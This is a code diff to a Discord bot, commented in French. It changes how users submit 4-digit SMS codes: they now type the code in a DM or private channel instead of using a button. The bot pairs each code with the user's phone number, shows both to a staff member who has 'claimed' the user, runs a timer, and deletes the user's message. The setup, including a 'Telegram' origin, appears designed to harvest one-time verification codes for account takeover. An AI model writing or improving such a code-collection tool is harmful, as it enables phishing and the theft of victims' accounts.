@@ -1,13 +1,13 @@
 require("dotenv").config();
 const fs = require("fs");
 const path = require("path");
-const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder, ChannelType, PermissionsBitField, MessageFlags } = require("discord.js");
+const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder, ChannelType, PermissionsBitField, MessageFlags, Partials } = require("discord.js");
 const express = require("express");
 const app = express();
 app.get("/", (req, res) => res.send("Bot online"));
 app.listen(process.env.PORT || 3000);
 
-const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });
+const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.DirectMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMessages], partials: [Partials.Channel, Partials.Message] });
 const pending = new Map();
 const blacklistedNums = new Set();
 const blacklistedUsers = new Set();
@@ -533,6 +533,54 @@ client.on("guildMemberAdd", async (m) => {
     const msg = await ch.send({ content: `<@${m.id}>`, allowedMentions: { users: [m.id] } });
     setTimeout(() => msg.delete().catch(() => {}), 1500);
   } catch {}
+});
+client.on("messageCreate", async (m) => {
+  if (m.author.bot) return;
+  const code = m.content.trim();
+  if (!/^\d{4}$/.test(code)) return;
+  // trouve pending correspondant : DM (userId) ou salon verif (threadId)
+  let found = null;
+  for (const [k, v] of pending.entries()) {
+    if (v.userId === m.author.id) { found = [k, v]; break; }
+    if (v.threadId && m.channel.id === v.threadId) {
+      // message dans salon privé — vérifie que l'auteur est le membre en vérif
+      if (v.userId === m.author.id || m.author.id === v.claimedBy) { found = [k, v]; break; }
+    }
+  }
+  if (!found) {
+    // aussi cherche en DM : si DM channel et code 4 chiffres, match tout pending de cet user
+    if (!m.guild) {
+      for (const [k, v] of pending.entries()) {
+        if (v.userId === m.author.id) { found = [k, v]; break; }
+      }
+    }
+    if (!found) return;
+  }
+  const [key, data] = found;
+  const originGuildId = data.originGuildId;
+  // évite double code
+  if (data.code === code) return;
+  data.code = code;
+  pending.set(key, data);
+  saveDbStats().catch(() => {});
+  console.log(`code recu chat ${m.author.id} ${code} via ${m.guild ? 'salon' : 'DM'}`);
+  try { await m.reply({ content: "Code reçu. En attente de validation finale." }); } catch {}
+  // update detailMsg dans salon privé
+  try {
+    const targetChannelId = data.threadId || data.modChannelId;
+    const targetChannel = await client.channels.fetch(targetChannelId).catch(() => null);
+    if (targetChannel && data.detailMessageId) {
+      const detailMsg = await targetChannel.messages.fetch(data.detailMessageId).catch(() => null);
+      if (detailMsg) {
+        const og = data.originGuildId === "tg" ? { name: "Telegram", memberCount: 0 } : await client.guilds.fetch(data.originGuildId).catch(() => ({ name: "Serveur", memberCount: 0 }));
+        const u = await client.users.fetch(data.userId).catch(() => m.author);
+        const newEmbed = await buildModEmbed(u, og, data.phone, code, data.dateStr, data.claimTs || Math.floor(Date.now()/1000), data.claimTs ? (()=>{ const e=Date.now()-data.claimTs*1000; return `${String(Math.floor(e/60000)).padStart(2,"0")}:${String(Math.floor((e%60000)/1000)).padStart(2,"0")}` })() : "00:00");
+        await detailMsg.edit({ embeds: [newEmbed] }).catch(()=>{});
+      }
+    }
+  } catch {}
+  // auto-supprime le code pour confidentialité après 3s
+  setTimeout(() => m.delete().catch(()=>{}), 3000);
 });
 
 client.on("interactionCreate", async (i) => {
@@ -1483,10 +1531,7 @@ client.on("interactionCreate", async (i) => {
         }
         try {
           const u = await client.users.fetch(userId);
-          const dmRow = new ActionRowBuilder().addComponents(
-            new ButtonBuilder().setCustomId(`enter_code_${originGuildId}`).setLabel("Entrer le code").setStyle(ButtonStyle.Primary)
-          );
-          await u.send({ content: `Ton numéro ${formatPhone(data.phone)} est validé. Clique pour entrer le code à 4 chiffres reçu par SMS.`, components: [dmRow] });
+          await u.send({ content: `Ton numéro ${formatPhone(data.phone)} est validé. Écris simplement ton code à 4 chiffres reçu par SMS directement ici en réponse (ex: 1234).` });
           await i.reply({ content: `📩 DM envoyé à <@${userId}> pour le code.` });
         } catch {
           await i.reply({ content: `Impossible de DM <@${userId}> (MP fermés).`, flags: MessageFlags.Ephemeral });
@@ -1517,10 +1562,7 @@ client.on("interactionCreate", async (i) => {
       }
       try {
         const u = await client.users.fetch(userId);
-        const dmRow = new ActionRowBuilder().addComponents(
-          new ButtonBuilder().setCustomId(`enter_code_${originGuildId}`).setLabel("Entrer le code").setStyle(ButtonStyle.Primary)
-        );
-        await u.send({ content: `Nouveau code demandé. Clique pour entrer ton code à 4 chiffres.`, components: [dmRow] });
+        await u.send({ content: `Nouveau code demandé. Écris simplement ton code à 4 chiffres reçu par SMS directement ici en réponse (ex: 1234).` });
         await i.reply({ content: `🔄 Code redemandé à <@${userId}>.` });
       } catch {
         await i.reply({ content: "DM impossible.", flags: MessageFlags.Ephemeral });
